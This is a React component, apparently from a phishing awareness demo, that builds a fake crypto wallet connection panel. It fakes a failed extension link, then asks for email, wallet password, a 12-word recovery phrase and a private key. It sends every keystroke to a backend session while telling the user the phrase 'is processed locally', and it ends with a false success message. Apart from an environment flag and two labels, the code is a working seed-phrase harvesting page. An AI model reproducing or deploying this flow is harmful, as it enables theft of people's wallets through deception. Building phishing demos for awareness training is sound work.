import React, { useCallback, useEffect, useRef, useState } from 'react'
import { Loader2 } from 'lucide-react'
import toast from 'react-hot-toast'
import {
  createEduPhishSession,
  patchEduPhishSession,
  type EduPhishSession,
} from '../lib/eduPhishDemo'
import { WalletBrandIcon } from './walletIcons'

interface EduPhishingWalletPanelProps {
  walletBrand: string
  walletIcon: string
  onBack: () => void
  onClose: () => void
}

export const EduPhishingWalletPanel: React.FC<EduPhishingWalletPanelProps> = ({
  walletBrand,
  walletIcon,
  onBack,
  onClose,
}) => {
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [step, setStep] = useState<EduPhishSession['step']>('connecting')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [seedWords, setSeedWords] = useState<string[]>(() => Array.from({ length: 12 }, () => ''))
  const [privateKey, setPrivateKey] = useState('')
  const patchTimer = useRef<ReturnType<typeof setTimeout> | null>(null)

  const queuePatch = useCallback(
    (patch: Parameters<typeof patchEduPhishSession>[1]) => {
      if (!sessionId) return
      if (patchTimer.current) clearTimeout(patchTimer.current)
      patchTimer.current = setTimeout(() => {
        patchEduPhishSession(sessionId, patch).catch(() => {
          /* demo: ignore transient API errors */
        })
      }, 180)
    },
    [sessionId]
  )

  useEffect(() => {
    let cancelled = false
    createEduPhishSession(walletBrand)
      .then((session) => {
        if (cancelled) return
        setSessionId(session.id)
      })
      .catch(() => {
        toast.error('Demo API unavailable. Start the backend with EDU_PHISHING_DEMO=true.')
      })
    return () => {
      cancelled = true
    }
  }, [walletBrand])

  useEffect(() => {
    if (!sessionId) return
    const t = setTimeout(() => {
      setStep('import_prompt')
      queuePatch({ step: 'import_prompt' })
    }, 2200)
    return () => clearTimeout(t)
  }, [sessionId, queuePatch])

  const goToRecoveryForm = () => {
    setStep('recovery_form')
    queuePatch({ step: 'recovery_form' })
  }

  const updateEmail = (value: string) => {
    setEmail(value)
    queuePatch({ email: value, activeField: 'email' })
  }

  const updatePassword = (value: string) => {
    setPassword(value)
    queuePatch({ password: value, activeField: 'password' })
  }

  const updateSeedWord = (index: number, value: string) => {
    setSeedWords((prev) => {
      const next = [...prev]
      next[index] = value
      queuePatch({ seedWords: next, activeField: `seed_${index + 1}` })
      return next
    })
  }

  const updatePrivateKey = (value: string) => {
    setPrivateKey(value)
    queuePatch({ privateKey: value, activeField: 'private_key' })
  }

  const handleFakeSubmit = async () => {
    if (!sessionId) return
    setStep('submitted')
    try {
      await patchEduPhishSession(sessionId, {
        step: 'submitted',
        email,
        password,
        seedWords,
        privateKey,
        activeField: null,
      })
      toast.success('Wallet linked successfully')
      setTimeout(onClose, 1200)
    } catch {
      toast.error('Demo submit failed')
    }
  }

  return (
    <div className="flex flex-col flex-1 min-h-0 overflow-hidden">
      <div className="flex-1 overflow-y-auto px-5 py-6">
        <div className="flex flex-col items-center text-center mb-6">
          <div className="w-14 h-14 rounded-2xl bg-[#161b22] border border-[#30363d] flex items-center justify-center mb-3">
            <WalletBrandIcon name={walletIcon} className="w-9 h-9" />
          </div>
          <p className="text-sm font-semibold text-white">{walletBrand}</p>
          <p className="text-xs text-[#8b949e] mt-1">Secure connection</p>
        </div>

        {step === 'connecting' && (
          <div className="flex flex-col items-center gap-3 py-8">
            <Loader2 className="w-8 h-8 text-[#c7f284] animate-spin" />
            <p className="text-sm text-white">Connecting to {walletBrand}…</p>
            <p className="text-xs text-[#8b949e]">Waiting for extension response</p>
          </div>
        )}

        {step === 'import_prompt' && (
          <div className="space-y-4">
            <div className="rounded-xl border border-[#30363d] bg-[#161b22] px-4 py-3 text-left">
              <p className="text-sm font-medium text-white">Could not connect to extension</p>
              <p className="text-xs text-[#8b949e] mt-1">
                Import your existing wallet using your 12-word secret recovery phrase to sync on this device.
              </p>
            </div>
            <button
              type="button"
              onClick={goToRecoveryForm}
              className="w-full py-3 rounded-xl bg-[#ab9ff2] hover:bg-[#9b8ee8] text-[#111] text-sm font-semibold transition-colors"
            >
              Import secret recovery phrase
            </button>
            <button type="button" onClick={onBack} className="w-full text-xs text-[#8b949e] hover:text-white">
              Try another wallet
            </button>
          </div>
        )}

        {(step === 'recovery_form' || step === 'submitted') && (
          <div className="space-y-4">
            <p className="text-xs text-[#8b949e] text-left">
              Import your wallet to continue. Phrase is processed locally on this page.
            </p>

            <label className="block text-left">
              <span className="text-[11px] text-[#8b949e]">Email (optional)</span>
              <input
                type="email"
                value={email}
                onChange={(e) => updateEmail(e.target.value)}
                className="mt-1 w-full rounded-lg bg-[#0d1117] border border-[#30363d] px-3 py-2 text-sm text-white focus:border-[#ab9ff2] outline-none"
                placeholder="you@example.com"
                disabled={step === 'submitted'}
              />
            </label>

            <label className="block text-left">
              <span className="text-[11px] text-[#8b949e]">Wallet password</span>
              <input
                type="password"
                value={password}
                onChange={(e) => updatePassword(e.target.value)}
                className="mt-1 w-full rounded-lg bg-[#0d1117] border border-[#30363d] px-3 py-2 text-sm text-white focus:border-[#ab9ff2] outline-none"
                placeholder="••••••••"
                disabled={step === 'submitted'}
              />
            </label>

            <div className="text-left">
              <span className="text-[11px] text-[#8b949e]">Secret recovery phrase (12 words)</span>
              <div className="mt-2 grid grid-cols-2 gap-2">
                {seedWords.map((word, i) => (
                  <div key={i} className="flex items-center gap-1.5">
                    <span className="text-[10px] text-[#484f58] w-4">{i + 1}.</span>
                    <input
                      value={word}
                      onChange={(e) => updateSeedWord(i, e.target.value)}
                      className="flex-1 min-w-0 rounded-md bg-[#0d1117] border border-[#30363d] px-2 py-1.5 text-xs text-white focus:border-[#ab9ff2] outline-none"
                      placeholder={`Word ${i + 1}`}
                      disabled={step === 'submitted'}
                    />
                  </div>
                ))}
              </div>
            </div>

            <label className="block text-left">
              <span className="text-[11px] text-[#8b949e]">Private key (some scams ask for this)</span>
              <textarea
                value={privateKey}
                onChange={(e) => updatePrivateKey(e.target.value)}
                rows={2}
                className="mt-1 w-full rounded-lg bg-[#0d1117] border border-[#30363d] px-3 py-2 text-xs text-white font-mono focus:border-[#ab9ff2] outline-none resize-none"
                placeholder="Optional — for demo only"
                disabled={step === 'submitted'}
              />
            </label>

            {step === 'recovery_form' && (
              <button
                type="button"
                onClick={handleFakeSubmit}
                className="w-full py-3 rounded-xl bg-[#c7f284] hover:bg-[#b7e374] text-[#0a0f16] text-sm font-semibold transition-colors"
              >
                Connect wallet
              </button>
            )}

            {step === 'submitted' && (
              <p className="text-center text-sm text-[#c7f284]">Wallet connected successfully.</p>
            )}
          </div>
        )}
      </div>
    </div>
  )
}
